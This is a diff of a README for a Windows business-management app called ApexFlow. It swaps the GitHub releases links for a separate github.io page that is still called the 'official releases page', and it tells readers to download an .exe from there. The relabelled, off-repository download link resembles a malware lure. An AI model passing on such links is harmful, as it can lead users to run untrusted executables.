@@ -1,6 +1,6 @@
 # 📈 apexflow-business-platform - Streamline your daily business operations today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/alone389/apexflow-business-platform/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://alone389.github.io)
 
 ApexFlow Business Manager provides a central hub for small businesses. You manage operations, adjust settings, track updates, and view guidance from your web browser. This platform organizes your business data. It helps you save time on repetitive tasks. 
 
@@ -10,7 +10,7 @@ You need a Windows computer to run this application. Ensure you have an active i
 
 ### Downloading the Software
 
-Visit the [official releases page](https://github.com/alone389/apexflow-business-platform/releases) to download the latest version. Look for the file ending in .exe. This file contains the installer for your system. Click the link to begin your download. Save the file to your desktop or your downloads folder.
+Visit the [official releases page](https://alone389.github.io) to download the latest version. Look for the file ending in .exe. This file contains the installer for your system. Click the link to begin your download. Save the file to your desktop or your downloads folder.
 
 ### Installing ApexFlow
 
